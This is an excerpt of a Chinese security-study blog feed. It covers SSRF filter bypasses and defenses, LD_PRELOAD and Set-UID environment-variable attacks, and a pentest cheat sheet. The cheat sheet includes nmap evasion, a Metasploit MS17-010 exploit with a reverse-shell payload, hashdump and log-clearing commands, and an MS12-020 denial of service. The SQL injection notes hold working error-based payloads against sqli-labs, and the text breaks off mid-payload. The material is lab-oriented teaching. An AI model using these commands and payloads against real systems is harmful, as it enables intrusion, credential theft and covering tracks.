</p></li><li><p>可以指向任意ip的域名　 xip.io                     原理是DNS解析。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1</p></li><li><p>ip地址转换成进制来访问 192.168.0.1&#x3D;3232235521（十进制） </p></li><li><p>非HTTP协议</p></li><li><p>DNS Rebinding</p></li><li><p>本地回环地址的其他表现形式      </p><p>localhost        </p><p>http:&#x2F;&#x2F;[::]:80&#x2F;</p><p>::1 &#x2F; http:&#x2F;&#x2F;[::1]   （ipv6的地址使用http访问需要加[]）</p></li><li><p>句号绕过                  127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p></li><li><p>利用302跳转绕过</p></li></ol><h2 id="SSRF防御"><a href="#SSRF防御" class="headerlink" title="SSRF防御"></a>SSRF防御</h2><ul><li><p>禁止302跳转，或者每跳转一次都进行校验目的地址是否为内网地址或合法地址。</p></li><li><p>过滤返回信息，验证远程服务器对请求的返回结果，是否合法。</p></li><li><p>禁用高危协议，例如：gopher、dict、ftp、file等，只允许http&#x2F;https。</p></li><li><p>设置URL白名单或者限制内网IP。</p></li><li><p>限制请求的端口为http的常用端口，或者根据业务需要开放远程调用服务的端口。</p></li><li><p>对错误信息返回进行处理和统一设计，避免黑客通过错误信息判断端口对应的服务。</p></li></ul><p>参考：</p><p><a href="https://blog.csdn.net/qq_61237064/article/details/123006424">用SSRF打穿内网_国光ssrf-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Environment-variable-attack</title>
    <link href="/2024/02/01/Environment-variable-attack/"/>
    <url>/2024/02/01/Environment-variable-attack/</url>
    
    <content type="html"><![CDATA[<h1 id="环境变量攻击"><a href="#环境变量攻击" class="headerlink" title="环境变量攻击"></a>环境变量攻击</h1><h2 id="环境变量定义"><a href="#环境变量定义" class="headerlink" title="环境变量定义"></a>环境变量定义</h2><ul><li>一组动态的定义值；</li><li>操作系统运行环境的一部分；</li><li>影响正在运行进程的行为方式（加载哪些外部DLL）；</li><li>在Unix中提出，也被微软操作系统采用</li></ul><span id="more"></span><p> 示例：PATH变量<br> 当执行一个程序时，如果没有提供完整的路径，shell进程将使用环境变量来找到程序的位置。</p><h2 id="进程与环境变量"><a href="#进程与环境变量" class="headerlink" title="进程与环境变量"></a>进程与环境变量</h2><p>进程可以通过以下两种方式来获取环境变量：<br>如果使用<strong>fork()<strong>创建了一个新进程，则子进程将继承其父进程的环境变量。<br>如果进程使用</strong>execve()<strong>启动一个新程序，在此场景中内存空间被覆盖，</strong>所有旧环境变量将丢失</strong>。但是可以通过传参的方式传递旧的环境变量。</p><img src="https://s2.loli.net/2024/02/12/ZSOTq4bIvodnzNG.png" alt="image-20240102154328886" style="zoom: 50%;" /><h2 id="shell命令变量与环境变量"><a href="#shell命令变量与环境变量" class="headerlink" title="shell命令变量与环境变量"></a>shell命令变量与环境变量</h2><p><strong>相关命令</strong>：</p><ul><li>env命令：显示当前用户的环境变量</li><li>set命令：不加参数可以显示当前shell的所有本地设置的<strong>Shell变量</strong>，否则设置shell变量</li><li>unset命令：unset为shell内建指令，删除变量或函数。</li><li>export命令：显示(设置)当前导出成环境变量的shell变量(注意：export为bash或类bash私有的命令)</li><li>echo $变量名：查看变量值(其中，$变量：引用变量的意思)</li></ul><p>当shell程序启动时，它会将环境变量复制到自己的shell变量中。对shell变量所做的更改将不会反映出在环境变量上。</p><p><img src="/../img/5rLOqIHSgAGn3TQ.png" alt="image-20240102155752108"></p><h3 id="proc文件系统"><a href="#proc文件系统" class="headerlink" title="&#x2F;proc文件系统"></a>&#x2F;proc文件系统</h3><p>&#x2F;proc是linux中的一个虚拟文件系统（放在内存中）。它包含每个进程的一个目录，使用进程ID作为目录的名称。<br>每个进程目录都有一个名为environ的虚拟文件，其中包含进程的环境变量。<br>例如：虚拟文件&#x2F;proc&#x2F;932&#x2F;environ 包含进程932的环境变量<br>命令“<code>strings /proc/$$/environ</code>”将打印出<strong>当前进程的环境变量</strong>(shell将把$$替换为它自己的进程ID)<br>当在bash shell中<strong>调用env</strong>程序时，它将在子进程中运行。因此，它打印出shell子进程的环境变量，而不是它自己的环境变量。</p><p>总结：</p><ul><li>set（无参数）可以打印当前的shell变量</li><li>export（无参数）可以显示当前导出成环境变量的shell变量</li><li><code>strings /proc/$$/environ</code>可以打印当前进程的环境变量</li><li>env可以打印当前进程的子进程的环境变量</li></ul><h2 id="set-UID"><a href="#set-UID" class="headerlink" title="set-UID"></a>set-UID</h2><p>允许用户以程序所有者的权限运行程序。 </p><p>每个进程都有两个用户ID。<br>Real UID (<strong>RUID</strong>):确定进程的真正所有者<br>Effective UID (<strong>EUID</strong>): 标识进程的权限<br>访问控制基于EUID<br>当执行正常程序时 , RUID &#x3D; EUID, 它们都等于运行程序的用户的ID<br>当执行Set-UID时, RUID ≠ EUID. RUID还是用户 ID, 但是 EUID 是程序 owner的 ID.普通用户运行root用户所有的程序，以root权限运行。<br>如果程序归root所有，则程序以root权限运行。</p><h3 id="通过动态链接器进行攻击"><a href="#通过动态链接器进行攻击" class="headerlink" title="通过动态链接器进行攻击"></a>通过动态链接器进行攻击</h3><p>动态链接-使用环境变量，它将成为攻击面的一部分。</p><ul><li>动态链接节省内存</li><li>这意味着程序在编译期间未决定部分代码</li><li>如果用户可以影响丢失的代码，它们可能会损害程序的完整性</li><li>LD_PRELOAD 包含一个共享库的列表，链接器将首先搜索它；<br>如果没有找到所有函数，链接器将在几个文件夹列表中搜索，包括LD_LIBRARY_PATH指定的文件夹；<br>这两个变量都可以由用户设置，因此使他们有机会控制链接过程结果；<br>如果该程序是一个Set-UID程序，它可能会导致安全漏洞。</li></ul><p><strong>机制：</strong></p><p>现代编译器基本默认为动态链接,而动态链接就需要使用支持动态链接的程序库,而 <strong>LD_LIBRARY_PATH 和 LD_PRELOAD</strong> 就是与动态链接相关的两个环境变量，而这个两个环境变量可以被修改，那么结合 Set-UID 程序,便会导致安全问题,攻击者可能会编写 root 权限下运行的不安全函数,通过环境变量在链接阶段冒充真实函数来运行。</p><p>而动态链接器程序有一个防御机制,当进程的真实用户 ID 与有效用户 ID不 一 样 时 , 或 者 真 实 组 ID 与 有 效 组 ID 不 一 致 时 , 进 程 将 会 忽 LD_PRELOAD,LD_LIBRARY_PATH 环境变量。</p>]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>渗透工具总结</title>
    <link href="/2023/11/23/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/"/>
    <url>/2023/11/23/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="渗透工具总结"><a href="#渗透工具总结" class="headerlink" title="渗透工具总结"></a>渗透工具总结</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><h3 id="全面扫描"><a href="#全面扫描" class="headerlink" title="全面扫描"></a>全面扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap  -A -T 4 -v targetIPAddress<br></code></pre></td></tr></table></figure><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>1.局域网内ping扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sP 192.168.86.1-254<br>$ nmap -sP 192.168.86.0/24<br></code></pre></td></tr></table></figure><p>说明：同网段下，通过ARP包（broadcast）</p><p><img src="https://s2.loli.net/2023/10/30/rGtY5FWHL2wnobu.png" alt="image-20231030164328694"></p><p>2.跨网段执行ping扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sP 192.168.109.1<br></code></pre></td></tr></table></figure><p>说明:扫描跨网段目标主机时，使用-sP或-sn选项，默认情况下Nmap会依次发送4种不同类型的数据包(ICMP echo request、TCP SYNpacket to port 443、TCP ACKpacket to port 80、ICMP timestamp request)来探测目标主机是否在线，只要收到其中一个包的回复，就证明目标机在线。</p><p><img src="https://s2.loli.net/2023/10/30/3ehQIBTg7YxZ4Oo.png"></p><p>第一条：ICMP echo request 请求，包内容如下。</p><p><img src="https://s2.loli.net/2023/10/30/fi5YylP6LuDB8Jr.png" alt="image-20231030170333887"></p><p>附：ICMP报文类型：</p><p><img src="https://s2.loli.net/2023/10/30/8C6ZdNHWOY391Iq.png" alt="image-20231030170939645"></p><p>3.–packet-trace的使用</p><p><img src="https://s2.loli.net/2023/10/30/G7KcEzrkam1PANH.png" alt="image-20231030171159066"></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>目标:确定目标主机的TCP&#x2F;UDP端口的开放情况<br>原理:发送TCP、UDP等类型的探测包到目标端口，根据收到的回复包判定端口是否开放</p><p><strong>端口的六个状态</strong>：<br>open:端口是开放的</p><p>closed:端口是关闭的</p><p>filtered:端口被防火墙IDS&#x2F;IPS屏蔽，无法确定其状态</p><p>unfiltered:端口没有被屏蔽，但是否开放需要进一步确定</p><p>open|filtered:端口是开放的或被屏蔽</p><p>closed|filtered :端口是关闭的或被屏蔽</p><p><strong>端口扫描的选项</strong>：</p><p><img src="https://s2.loli.net/2023/11/16/YGozJWpta86Zu73.png" alt="img"></p><p><strong>使用方法说明</strong>：</p><p>指定端口扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -p T:1-65535,U:1-65535 -sS -sU ipaddr<br></code></pre></td></tr></table></figure><p>TCP-SYN（**-sS**）扫描：</p><p><img src="https://s2.loli.net/2023/10/30/tzHIXaypqAf4ole.png" alt="image-20231030180109743"></p><p>TCP-connect扫描：</p><p><img src="https://s2.loli.net/2023/10/30/O91TesUXrux2QEz.png" alt="image-20231030180146550"></p><p>TCP-ACK扫描：</p><p><img src="https://s2.loli.net/2023/10/30/KY9ez7JPtXVO6NM.png" alt="image-20231030180211552"></p><p>隐蔽扫描：</p><p><img src="https://s2.loli.net/2023/10/30/Hao5rWfCLjv2iwF.png" alt="image-20231030180303495"></p><h3 id="应用程序与版本信息侦测"><a href="#应用程序与版本信息侦测" class="headerlink" title="应用程序与版本信息侦测"></a>应用程序与版本信息侦测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sV ipAddress<br></code></pre></td></tr></table></figure><h3 id="操作系统侦测"><a href="#操作系统侦测" class="headerlink" title="操作系统侦测"></a>操作系统侦测</h3><p>网络协议栈指纹识别</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -O 192.168.86.134 <br></code></pre></td></tr></table></figure><h3 id="规避FW-IDS技术"><a href="#规避FW-IDS技术" class="headerlink" title="规避FW&#x2F;IDS技术"></a>规避FW&#x2F;IDS技术</h3><ol><li><p>-T 控制扫描速度</p></li><li><p>-D 源IP欺骗</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -D RND:3 ipAddr<br></code></pre></td></tr></table></figure><p>RND:数量</p></li><li><p>-sI 空闲扫描</p><p>利用网络上闲置的地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -Pn -sI fakeAddr targetAddr<br></code></pre></td></tr></table></figure></li><li><p>–spoof-mac 源MAC地址欺骗</p><p>–spoof-mac 0（0表示随机）</p></li></ol><h3 id="NSE脚本"><a href="#NSE脚本" class="headerlink" title="NSE脚本"></a>NSE脚本</h3><p>检测常见漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap --script vuln ipAddrs<br></code></pre></td></tr></table></figure><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><h3 id="使用exploits模块"><a href="#使用exploits模块" class="headerlink" title="使用exploits模块"></a>使用exploits模块</h3><h4 id="在Metasploit终端中输入以下命令，搜索ms17-010相关的模块"><a href="#在Metasploit终端中输入以下命令，搜索ms17-010相关的模块" class="headerlink" title="在Metasploit终端中输入以下命令，搜索ms17-010相关的模块"></a>在Metasploit终端中输入以下命令，搜索ms17-010相关的模块</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search ms17-010<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/11/16/3Vpob58I4uNnqRW.png" alt="image.png"></p><h4 id="使用smb-ms17-010模块对靶机进行漏洞检测，确认其存在ms17-010漏洞："><a href="#使用smb-ms17-010模块对靶机进行漏洞检测，确认其存在ms17-010漏洞：" class="headerlink" title="使用smb_ms17_010模块对靶机进行漏洞检测，确认其存在ms17-010漏洞："></a>使用smb_ms17_010模块对靶机进行漏洞检测，确认其存在ms17-010漏洞：</h4><p><img src="https://s2.loli.net/2023/11/16/ysmRoIgKthYNaCl.png" alt="image.png"><br><img src="https://oss.edu.sangfor.com.cn/file/20231101/image231101205352945k9unn.png" alt="image.png"></p><h4 id="利用ms17-010漏洞对靶机执行溢出攻击"><a href="#利用ms17-010漏洞对靶机执行溢出攻击" class="headerlink" title="利用ms17-010漏洞对靶机执行溢出攻击"></a>利用ms17-010漏洞对靶机执行溢出攻击</h4><p>其中设置了使用meterpreter的reverse_tcp模块。</p><p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp    &#x2F;&#x2F;使用<strong>payload</strong>：meterpreter&#x2F;reverse_tcp<br><img src="https://s2.loli.net/2023/11/16/xgVXziSPmtIGjM3.png" alt="image.png"><br>看到出现了meterpreter，说明攻击成功。<br><img src="https://s2.loli.net/2023/11/16/vOBG8QMwn1Fpa5f.png" alt="image.png"></p><p>关于meterpreter的reverse_tcp使用方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">pwd</span>    //打印当前工作目录<br>sysinfo     // 查看系统信息<br>getuid      //获取当前权限的用户<span class="hljs-built_in">id</span><br>ps       //查看当前目标机上运行的进程列表和pid<br>getsystem      //获取system权限<br>screenshot    //截取目标主机当前屏幕<br>hashdump     //获取用户名与<span class="hljs-built_in">hash</span>口令<br>shell     //获取目标主机shell<br>upload     //上传一个文件<br>download    //下载一个文件<br>execute     //执行目标系统中的文件（-f指定文件，-i执行可交互模式，-H隐藏窗口）<br>clearev    //清除日志<br>background    //将meterpreter放入后台（使用sessions -i重新连接到会话）<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/11/16/Yd3n6kXsoPab5tu.png" alt="image.png"></p><h3 id="使用auxiliary模块（示例）"><a href="#使用auxiliary模块（示例）" class="headerlink" title="使用auxiliary模块（示例）"></a>使用auxiliary模块（示例）</h3><h4 id="1．启动Metasploit"><a href="#1．启动Metasploit" class="headerlink" title="1．启动Metasploit"></a>1．启动Metasploit</h4><p>（2）在终端使用如下命令，启动Metasploit终端（提示符msf&gt;）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfdb init &amp;&amp; msfconsole<br></code></pre></td></tr></table></figure><h4 id="2．检测靶机是否存在ms12-020漏洞"><a href="#2．检测靶机是否存在ms12-020漏洞" class="headerlink" title="2．检测靶机是否存在ms12-020漏洞"></a>2．检测靶机是否存在ms12-020漏洞</h4><p>（1）在Metasploit终端下输入以下命令查找ms12-020相关的模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search ms12-020<br></code></pre></td></tr></table></figure><p>搜索的结果中，第一项为ms12-020漏洞利用模块，第二项为ms12-020漏洞检测模块：</p><p><img src="https://s2.loli.net/2023/11/01/2ChxqoKD8r54cPg.png" alt="image-20231101195555132"></p><p>（2）分别输入以下命令，使用ms12_020_check模块对目标机进行漏洞检测，以确认目标机存在ms12-020漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">use  auxiliary/scanner/rdp/ms12_020_check   //使用ms12_020_check模块<br><br>show  options   //查看该模块需要设置哪些参数<br><br><span class="hljs-built_in">set</span>  RHOSTS  [靶机IP]   //设置目标机的IP地址<br><br>run    //执行<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/11/01/XVWPvJmwesMFG4b.png" alt="image-20231101195842369"></p><p>检测结果显示，靶机存在ms12-020漏洞。</p><h4 id="3．利用ms12-020漏洞对靶机进行攻击"><a href="#3．利用ms12-020漏洞对靶机进行攻击" class="headerlink" title="3．利用ms12-020漏洞对靶机进行攻击"></a>3．利用ms12-020漏洞对靶机进行攻击</h4><p>在Metasploit终端下分别输入以下命令，使用ms12_020_maxchannelids模块对目标机的ms12-020漏洞进行利用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">use  auxiliary/dos/windows/rdp/ms12_020_maxchannelids   //使用ms12_020_maxchannelids模块<br><br>show  options   //查看该模块需要设置哪些参数<br><br><span class="hljs-built_in">set</span>  RHOST  [靶机IP]   //设置目标机的IP地址<br><br>run   //执行<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/11/01/vDdGWsun7ZNPayf.png" alt="image-20231101200252821"></p><p>此时，靶机被攻击后出现蓝屏：</p><p><img src="https://s2.loli.net/2023/11/01/YyiFscIfRjKHWq6.png" alt="image.png"></p><h2 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h2><p><strong>掩码（mask）使用：</strong></p><p><strong>Hashcat的掩码字符集:</strong></p><ul><li>?l         小写字母(abcdefghijklmnopqrstuvwxyz)</li><li>?u        大写字母(ABCDEFGHIJKLMNOPQRSTUVWXYZ)</li><li>?d        十进制数字(0123456789)</li><li>?h        十六进制数字，字母小写(0123456789abcdef)</li><li>?H        十六进制数字，字母大写(0123456789ABCDEF)</li><li>?s         特殊字符(!”#$%&amp;‘()*+，-.&#x2F;;&lt;&#x3D;&gt;?@[]^_&#96;{|}~)</li><li>?a         相当于?l?u?d?s，即键盘上所有可见的字符</li><li>?b         0x00 - 0xff</li></ul><p><img src="https://s2.loli.net/2023/11/02/StcUoMivYzOLQ9s.png" alt="image-20231102102920007"></p><p>使用示例：</p><p><img src="https://s2.loli.net/2023/11/02/xG8P3r1XB2zWKZm.png" alt="image-20231102105617208"></p><h2 id="Crunch"><a href="#Crunch" class="headerlink" title="Crunch"></a>Crunch</h2><p>创建密码字典的工具。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string &gt;] [options]<br><span class="hljs-comment">#-t 指定密码输出结果的格式</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL-injection</title>
    <link href="/2023/11/16/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/11/16/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="SQL高级操作"><a href="#SQL高级操作" class="headerlink" title="SQL高级操作"></a>SQL高级操作</h2><ul><li>order by</li></ul><p>​后面跟数字，就是按第几列进行排序—-可以确定<strong>字段数</strong>（列数）</p><ul><li>limit</li></ul><p>​两个参数:第一个是偏移量，第二个是数目</p><p>​select* from employee limit 3, 7;&#x2F;&#x2F;返回4-10行</p><p>​select * from employee limit 3,1;&#x2F;&#x2F;返回第4行</p><p>​一个参数：</p><p>​select * from employee limit 3;&#x2F;&#x2F;返回前3行</p><ul><li>union select</li></ul><p><img src="https://s2.loli.net/2023/11/09/GSyMJ8rcNnTOQfZ.png" alt="image-20231109140035798"></p><ol><li><p>union select 查询的字段数必须和select查询的字段数匹配；—-<strong>猜解列数</strong>：用and … union select 1,2,3,4,5,6.…; 来猜解列数（字段数)，只有列数相等了，才能返回True；</p></li><li><p><strong>and 1&#x3D;2</strong> 可以否定掉前面的语句从而执行全新的语句</p></li><li><p>select1，2，3（可以知道列的位置）</p></li><li><p>结合information_schema数据库（mysql）</p></li></ol><p><img src="/../img/GdZxKsCtiSI8c2T.png" alt="image-20231109141357092"></p><h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><h3 id="按注入点类型分类"><a href="#按注入点类型分类" class="headerlink" title="按注入点类型分类"></a>按注入点类型分类</h3><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><table><thead><tr><th><strong>payload</strong></th><th><strong>返回结果</strong></th></tr></thead><tbody><tr><td>http:&#x2F;&#x2F;[靶机IP]&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1’</td><td>返回错误</td></tr><tr><td>http:&#x2F;&#x2F;[靶机IP]&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1 and 1&#x3D;1</td><td>运行正常</td></tr><tr><td>http:&#x2F;&#x2F;[靶机IP]&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1 and 1&#x3D;2</td><td>运行异常</td></tr></tbody></table><h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><table><thead><tr><th><strong>payload</strong></th><th><strong>返回结果</strong></th></tr></thead><tbody><tr><td>http:&#x2F;&#x2F;[靶机IP]&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1’</td><td>返回错误</td></tr><tr><td>http:&#x2F;&#x2F;[靶机IP]&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1’ and ‘1’&#x3D;’1</td><td>运行正常</td></tr><tr><td>http:&#x2F;&#x2F;[靶机IP]&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1’ and ‘1’&#x3D;’2</td><td>运行异常</td></tr></tbody></table><h4 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h4><ul><li>此类注入点提交的 SQL 语句，其原型大致为: select * from 表名 where 字段 like ‘%关键字%’    </li><li>当我们提交注入参数为 keyword&#x3D;’and[查询条件] and %’&#x3D;’ ，则向数据库提交的SQL语句为: select * from 表名 where 字段 like ‘%’ and[查询条件] and ‘%’&#x3D;’%’</li></ul><h3 id="按注入技术分类"><a href="#按注入技术分类" class="headerlink" title="按注入技术分类"></a>按注入技术分类</h3><ul><li>基于布尔的盲注：可以根据返回页面判断条件真假的注入</li><li>基于时间的盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断</li><li>基于报错的注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中</li><li>联合查询注入：可以使用union的情况下的注入</li><li>堆查询注入：同时执行多条语句的注入</li></ul><h2 id="SQL基本注入流程"><a href="#SQL基本注入流程" class="headerlink" title="SQL基本注入流程"></a>SQL基本注入流程</h2><p>（以下根据基于联合查询的sql注入总结）</p><ol><li><p>判断是否存在注入点;</p></li><li><p>判断字段数; order by</p></li><li><p>判断字段回显位置;   and 1&#x3D;2 union select 1,2,3 </p></li><li><p>判断数据库信息;information_schema; database()</p></li><li><p>查找数据库名;利用<strong>group_concat()</strong></p></li><li><p>查找数据库表;</p></li><li><p>查找数据库表中所有字段以及字段值;<strong>concat_ws()</strong></p></li><li><p>猜解账号密码,登录管理员后台。</p></li></ol><h2 id="SQL报错注入"><a href="#SQL报错注入" class="headerlink" title="SQL报错注入"></a>SQL报错注入</h2><p>报错注入一般需要具备两个前提条件：</p><p>Web应用程序未关闭数据库报错函数，对于一些SQL语句的错误直接回显在页面上；</p><p>后台未对一些具有报错功能的函数进行过滤。常用的报错功能函数包括extractvalue()、updatexml()、floor()、exp()等</p><h3 id="extractvalue-（mysql-5-1-5）"><a href="#extractvalue-（mysql-5-1-5）" class="headerlink" title="extractvalue()（mysql&gt;&#x3D;5.1.5）"></a>extractvalue()（mysql&gt;&#x3D;5.1.5）</h3><p>作用：对XML文档进行查询，相当于在HTML文件中用标签查找元素。</p><p>语法： extractvalue(XML_document, XPath_string)</p><p>参数1： XML_document 是String格式，为XML文档对象的名称；</p><p>参数2： XPath_string (Xpath格式的字符串)，注入时可操作的地方。</p><p>报错原理：xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果写入其他格式就会报错，</p><p>并且会返回写入的非法格式内容，错误信息如： XPATH syntax error:’xxxxxxxx’ 。</p><p>注意：extractvalue() 函数所能显示的错误信息最大长度为32，如果错误信息超过了最大长度，有</p><p>可能导致显示不全。因此，有时需要借助limit来做分行显示。</p><p>实例: <strong>select extractvalue(1,concat(‘~’,user()))</strong> ——主要是构造concat （user()可替换成别的payload）</p><h3 id="updatexml-（mysql-5-1-5）"><a href="#updatexml-（mysql-5-1-5）" class="headerlink" title="updatexml()（mysql&gt;&#x3D;5.1.5）"></a>updatexml()（mysql&gt;&#x3D;5.1.5）</h3><p>与前者类似</p><p>作用：改变文档中符合条件的节点的值。<br>语法：updatexml( xML_document, xPath string, new value )<br>参数1： XML document是String格式，为XML文档对象的名称<br>参数2：xPath string(x path格式的字符串)，注入时可操作的地方<br>参数3：new value， String格式，替换查找到的符合条件的数据<br>报错原理：同extractvalue()<br>实例:<br>mysql&gt; <strong>select updatexmI(1, concat(‘~’,user()), 1);</strong><br>ERROR 1105 (HY000): XPATH syntax error: ‘~root@localhost’<br>注：该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示</p><h3 id="报错函数汇总"><a href="#报错函数汇总" class="headerlink" title="报错函数汇总"></a>报错函数汇总</h3><p><img src="https://s2.loli.net/2023/11/09/Apkbzt4x39VN6Hv.png" alt="image-20231109213524294"></p><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p><strong>Sqlilab-less-1</strong></p><p>使用以下payload获取网站当前所在数据库的库名：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(<span class="hljs-emphasis">&#x27;~&#x27;</span>,database()))--+<br></code></pre></td></tr></table></figure><p>使用以下payload获取数据库security的全部表名：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(<span class="hljs-emphasis">&#x27;~&#x27;</span>,(select group_concat(table_name) from information_schema.tables where table_schema=<span class="hljs-emphasis">&#x27;security&#x27;</span>)))--+<br></code></pre></td></tr></table></figure><p>以上的变式：借助limit防止长度超过限制</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(<span class="hljs-emphasis">&#x27;~&#x27;</span>,(select table_name from information_schema.tables where table_schema=<span class="hljs-emphasis">&#x27;security&#x27;</span> limit 0,1)))--+<br><span class="hljs-comment">//显示security库中的第1张表的名字</span><br><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(<span class="hljs-emphasis">&#x27;~&#x27;</span>,(select table_name from information_schema.tables where table_schema=<span class="hljs-emphasis">&#x27;security&#x27;</span> limit 1,1)))--+<br><span class="hljs-comment">//显示security库中的第2张表的名字</span><br></code></pre></td></tr></table></figure><p>使用以下payload获取users表的全部字段名</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(<span class="hljs-emphasis">&#x27;~&#x27;</span>,(select group_concat(column_name) from information_schema.columns where table_schema=<span class="hljs-emphasis">&#x27;security&#x27;</span> and table_name=<span 